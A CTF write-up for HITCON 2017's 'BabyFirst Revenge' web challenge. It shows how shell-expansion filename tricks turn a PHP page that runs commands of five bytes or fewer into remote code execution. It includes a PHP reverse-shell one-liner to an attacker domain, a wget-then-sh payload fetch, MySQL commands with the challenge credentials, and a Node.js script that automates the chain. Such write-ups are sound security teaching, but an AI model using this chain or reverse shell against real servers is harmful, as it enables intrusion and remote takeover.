[writeup by @TheNodi]

**CTF:** HITCON 2017 Quals

**Team:** spritzers (from [SPRITZ Research Group](http://spritz.math.unipd.it/))

**Task:** web / BabyFirst Revenge

The following is the challenge script running on the remote server:

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

It just executes every command **if it is 5 or less bytes**, without displaying any output.

We immediately discovered that everyone's sandbox folder was available at `http://52.199.204.34/sandbox/md5(orange+IP)/`. The webserver does not list the folder content, but any file inside it is served: this allows us to save content to a file and view it in the browser.

There is little we can do with <= 5 bytes, apparently. Writing is a bit challenging: it's hard to write inside files, but easy to write (empty) files with names. Executing `>abcd` will create a file named `abcd`.
To execute more useful commands (especially with arguments) we can use shell expansion: it will take a `*` and expand it to all the files in the current directory. This means that, naming files appropriately, we easily can run commands of length <= 4, with arguments <=4, given that `command` precedes `argument` in alphabetical order.

To locate the file, we can use `find` to list every file in the system and check if something looks interesting. We ran `>find` to create a file called `find`, and then `* />z`, which expands to `find / > z`. We opened `z` in the browser and looked at the list of files. The flag probably is inside `/home/fl4444g/README.txt`.

~~There's no way we can read that file with just 5 bytes~~ One of the commands that precedes, in alphabetical order, its option is `tar`. It's probably not very _kosher_ to do, but we `tar`ed the home folders with the above technique, and downloaded the resulting archive. Unfortunately...

```
/home/fl4444g/README.txt
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr
```

...we need remote code execution.

We can use shell expansion to call `wget` and download a custom script, but we need to create a file named as our domain.

After some looking around, we found an interesting option of the `mv` command: `-S, --suffix`. We can move files around adding a suffix, a letter at a time. 

Unfortunately to expand properly we need our domain to begin with a letter that comes after `m` (of `mv`), luckily we can use dots so we just created `thedomain.no-ip.org` which points to one of out machines.

On that machine we exposed two things. A web server that answer every request with a reverse shell code, we choose PHP because we know it's available on the target machine: `php -r '$sock=fsockopen("thedomain.no-ip.org",9999);exec("/bin/sh -i <&3 >&3 2>&3");'`. A netcat socket on port `9999` the target machine will connect to: `nc -lp 9999`.

We can now setup the target machine. We create 3 files: `mv` to run our command, `n` as a dumb file for mv, `t` as the starting point of our domain name. We can now keep calling `* -Sh`, which will add the given letter (in this case `h`) to our files. Once we are done, we remove the `mv` file and we create a `wget` file.

Our directory will contain the following files: `wget`, `thedomain.no-ip.or`, `thedomain.no-ip.org`.

We can now run `w* *`, which will expand to `wget thedomain.no-ip.or thedomain.no-ip.org wget`. Wget will try to download files from each of those urls, but only our site will be up, so the content of that will be saved as `index.html`. 

We can now run our `index.html` as a shell script using `sh i*`.

If we switch to our netcat terminal tab, we will find a fancy prompt saying `$` and waiting for our commands. We are done.

Everything else is straightforward:
```
$ cat /home/fl4444g/README.txt
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr

$ mysql -u fl4444g -pSugZXUtgeJ52_Bvr -e "show databases;"
mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
fl4gdb

$ mysql -u fl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb; show tables;"
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_fl4gdb
this_is_the_fl4g

$ mysql -u fl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb; select * from this_is_the_fl4g;"
mysql: [Warning] Using a password on the command line interface can be insecure.
secret
hitcon{idea_from_phith0n,thank_you:)}
```

Our flag is: `hitcon{idea_from_phith0n,thank_you:)}`

### Automated script
```js
#!/usr/bin/env node
const fetch = require("node-fetch");

function reset() {
    return fetch("http://52.199.204.34/?reset=1");
}

function exec(cmd) {
    return fetch("http://52.199.204.34/?cmd=" + encodeURIComponent(cmd));
}

(async () => {
    await reset();

    await exec(`>mv`);
    await exec(`>n`);

    const address = 'thedomain.no-ip.org';
    for (let i = 0; i < address.length; i++) {
        if (i == 0) {
            await exec(`>${address[i]}`);
        } else {
            await exec(`* -S${address[i]}`);
        }
    }

    await exec(`rm m*`);
    await exec(`>wget`);
    await exec(`w* *`);
    await exec(`sh i*`);

    console.log('OK');
})();
```
